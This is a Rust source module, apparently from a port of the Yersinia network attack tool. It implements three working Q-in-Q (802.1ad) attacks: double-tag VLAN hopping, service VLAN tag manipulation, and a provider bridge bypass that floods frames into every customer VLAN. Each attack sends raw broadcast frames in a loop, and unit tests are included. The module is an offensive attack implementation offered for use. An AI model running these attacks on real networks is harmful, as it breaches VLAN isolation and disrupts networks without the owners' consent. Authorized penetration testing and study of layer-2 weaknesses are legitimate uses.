//! Q-in-Q Attack Implementations
use super::packet::QinQPacket;
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct QinQVlanHoppingAttack {
    pub service_vlan: u16,
    pub target_customer_vlan: u16,
}

impl QinQVlanHoppingAttack {
    pub fn new(s_vlan: u16, c_vlan: u16) -> Self {
        Self {
            service_vlan: s_vlan,
            target_customer_vlan: c_vlan,
        }
    }

    pub fn build_packet(&self) -> QinQPacket {
        QinQPacket::new(self.service_vlan, self.target_customer_vlan).with_payload(vec![0xAA; 64])
    }
}

#[derive(Debug, Clone)]
pub struct ServiceVlanManipulationAttack {
    pub source_s_vlan: u16,
    pub target_s_vlan: u16,
    pub customer_vlan: u16,
}

impl ServiceVlanManipulationAttack {
    pub fn new(src_s_vlan: u16, tgt_s_vlan: u16, c_vlan: u16) -> Self {
        Self {
            source_s_vlan: src_s_vlan,
            target_s_vlan: tgt_s_vlan,
            customer_vlan: c_vlan,
        }
    }

    pub fn build_packets(&self) -> Vec<QinQPacket> {
        vec![
            // Original S-TAG
            QinQPacket::new(self.source_s_vlan, self.customer_vlan),
            // Manipulated S-TAG
            QinQPacket::new(self.target_s_vlan, self.customer_vlan),
        ]
    }
}

#[derive(Debug, Clone)]
pub struct ProviderBridgeBypassAttack {
    pub bypass_s_vlan: u16,
    pub inject_c_vlans: Vec<u16>,
}

impl ProviderBridgeBypassAttack {
    pub fn new(s_vlan: u16) -> Self {
        Self {
            bypass_s_vlan: s_vlan,
            inject_c_vlans: vec![],
        }
    }

    pub fn with_customer_vlans(mut self, c_vlans: Vec<u16>) -> Self {
        self.inject_c_vlans = c_vlans;
        self
    }

    pub fn build_packets(&self) -> Vec<QinQPacket> {
        let mut packets = Vec::new();

        if self.inject_c_vlans.is_empty() {
            // Inject all possible C-VLANs
            for c_vlan in 1..=4094 {
                packets.push(QinQPacket::new(self.bypass_s_vlan, c_vlan));
            }
        } else {
            // Inject specific C-VLANs
            for &c_vlan in &self.inject_c_vlans {
                packets.push(QinQPacket::new(self.bypass_s_vlan, c_vlan));
            }
        }

        packets
    }
}

#[async_trait]
impl Attack for QinQVlanHoppingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let qinq_bytes = self.build_packet().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::QinQ,
                qinq_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Q-in-Q VLAN Hopping"
    }
}

#[async_trait]
impl Attack for ServiceVlanManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(200);
        let packets = self.build_packets();

        let mut idx = 0;
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let qinq_bytes = packets[idx % packets.len()].to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::QinQ,
                qinq_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            idx += 1;
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Service VLAN Manipulation"
    }
}

#[async_trait]
impl Attack for ProviderBridgeBypassAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(50);
        let packets = self.build_packets();

        for (idx, packet) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let qinq_bytes = packet.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::QinQ,
                qinq_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }

            if idx % 100 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Provider Bridge Bypass"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_qinq_vlan_hopping() {
        let attack = QinQVlanHoppingAttack::new(100, 200);
        let pkt = attack.build_packet();
        assert_eq!(pkt.s_tag.vlan_id, 100);
        assert_eq!(pkt.c_tag.vlan_id, 200);
    }

    #[test]
    fn test_service_vlan_manipulation() {
        let attack = ServiceVlanManipulationAttack::new(10, 20, 30);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 2);
        assert_eq!(packets[0].s_tag.vlan_id, 10);
        assert_eq!(packets[1].s_tag.vlan_id, 20);
    }

    #[test]
    fn test_provider_bridge_bypass() {
        let attack = ProviderBridgeBypassAttack::new(100).with_customer_vlans(vec![10, 20, 30]);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 3);
    }

    #[test]
    fn test_full_bypass() {
        let attack = ProviderBridgeBypassAttack::new(50);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 4094); // All valid VLANs
    }
}
